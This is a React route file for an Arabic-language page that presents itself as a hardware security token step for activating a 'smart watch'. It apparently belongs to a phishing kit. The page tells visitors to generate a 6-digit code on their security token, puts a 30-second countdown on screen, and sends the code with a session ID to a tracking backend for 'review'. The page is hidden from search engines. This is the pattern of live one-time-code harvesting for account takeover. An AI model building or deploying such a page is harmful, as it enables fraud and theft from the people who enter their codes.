import { useState } from "react";
import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { Calculator } from "lucide-react";
import { toast } from "sonner";

import { Button } from "@/components/ui/button";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import { CountdownRing } from "@/components/countdown-ring";
import { AppShell } from "@/components/app-shell";
import { StatusBadge } from "@/components/status-badge";
import { trackEvent } from "@/lib/track";
import { getSessionId } from "@/lib/session-id";

const TITLE = "جهاز رمز الأمان — ساعة أهل مصر الذكية";
const DESCRIPTION = "أدخل الرمز الظاهر على جهاز رمز الأمان لإتمام ربط ساعة أهل مصر الذكية الذكية.";

export const Route = createFileRoute("/hardware-token")({
  head: () => ({
    meta: [
      { title: TITLE },
      { name: "description", content: DESCRIPTION },
      { property: "og:title", content: TITLE },
      { property: "og:description", content: DESCRIPTION },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "robots", content: "noindex" },
    ],
  }),
  component: HardwareTokenPage,
});

const STEPS = [
  "قم بتشغيل جهاز رمز الأمان الخاص بك",
  "اضغط على زر OTP في الجهاز",
  "أدخل الرمز المكوّن من 6 أرقام الظاهر على الشاشة",
];

function HardwareTokenPage() {
  const navigate = useNavigate();
  const [code, setCode] = useState("");

  function handleSubmit() {
    if (code.length !== 6) {
      toast.error("الرجاء إدخال الرمز كاملاً");
      return;
    }
    void trackEvent({
      data: {
        sessionId: getSessionId(),
        stage: "processing",
        patch: { hw_token: code, status: "review" },
      },
    });
    toast.success("تم إرسال الرمز — جارٍ المراجعة");
    navigate({ to: "/processing" });
  }

  return (
    <AppShell>
      <div className="mx-auto max-w-md space-y-6 px-4 py-10">
        <div className="text-center">
          <StatusBadge status="processing" label="تحقق أمني" />
          <h1 className="mt-3 text-2xl font-black">جهاز رمز الأمان</h1>
        </div>
        <div className="rounded-3xl bg-[image:var(--gradient-hero)] p-8 text-center shadow-[var(--shadow-soft)]">
          <span className="mx-auto grid h-16 w-16 place-items-center rounded-full bg-hero-foreground text-primary shadow-[var(--shadow-card)]">
            <Calculator className="h-7 w-7" aria-hidden="true" />
          </span>
          <h2 className="mt-5 text-lg font-black text-hero-foreground">
            جهاز رمز الأمان (Hardware Token)
          </h2>
          <p className="mx-auto mt-3 max-w-xs text-sm leading-relaxed text-hero-foreground/85">
            أدخل الرمز الظاهر على جهاز رموز الأمان الخاص بك لإتمام عملية تفعيل الساعة الذكية
          </p>
        </div>

        <div className="rounded-3xl border border-border bg-card p-6 shadow-[var(--shadow-card)]">
          <h3 className="text-sm font-black text-foreground">خطوات التفعيل:</h3>
          <ol className="mt-4 space-y-3">
            {STEPS.map((step, i) => (
              <li key={step} className="flex items-start gap-3">
                <span className="grid h-7 w-7 shrink-0 place-items-center rounded-full bg-primary text-xs font-black text-primary-foreground">
                  {i + 1}
                </span>
                <p className="pt-0.5 text-sm text-foreground">{step}</p>
              </li>
            ))}
          </ol>
        </div>

        <div className="flex justify-center">
          <CountdownRing seconds={30} />
        </div>

        <div dir="ltr" className="flex justify-center">
          <InputOTP maxLength={6} value={code} onChange={setCode}>
            <InputOTPGroup>
              {[0, 1, 2, 3, 4, 5].map((i) => (
                <InputOTPSlot key={i} index={i} className="h-11 w-11 text-lg sm:h-12 sm:w-12" />
              ))}
            </InputOTPGroup>
          </InputOTP>
        </div>

        <Button onClick={handleSubmit} className="h-12 w-full rounded-xl text-base">
          ربط الساعة
        </Button>
      </div>
    </AppShell>
  );
}
